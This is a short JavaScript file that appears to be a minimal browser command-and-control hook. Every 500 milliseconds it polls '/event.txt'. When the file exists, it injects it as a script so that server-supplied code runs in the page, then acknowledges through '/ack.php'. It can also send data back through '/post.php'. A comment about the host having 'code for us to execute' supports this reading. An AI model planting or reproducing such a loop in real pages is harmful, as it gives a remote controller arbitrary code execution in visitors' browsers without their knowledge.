var postdata = "default_postback";

function ack() {
    var ackReq = new XMLHttpRequest();
    ackReq.open("GET", "/ack.php",false);
    ackReq.send();
    
}


function handler() {
    console.log("handler run");
    
    if(this.status == 200) {
        var script = document.createElement("script");
        script.src = "/event.txt";
        script.type = "application/javascript";
        document.head.appendChild( script );
        ack();
    }
    else
    {
        console.log("XHR status returned " + this.status + ", wich is not 200"); //its likely 404 so we can assume the host has no code for us to execute.
    }
}

function testEventFile() {
    var xhr = new XMLHttpRequest();
    xhr.addEventListener("load", handler);
    xhr.open("GET", "/event.txt");
    xhr.send();
}

function postback(postdata) {
	var posturl = "/post.php?postback=" + postdata;
	console.log(posturl);
	var xmlHTTP = new XMLHttpRequest();
	xmlHTTP.open("GET", posturl, false);
	xmlHTTP.send();
};



setInterval(function(){testEventFile()}, 500);
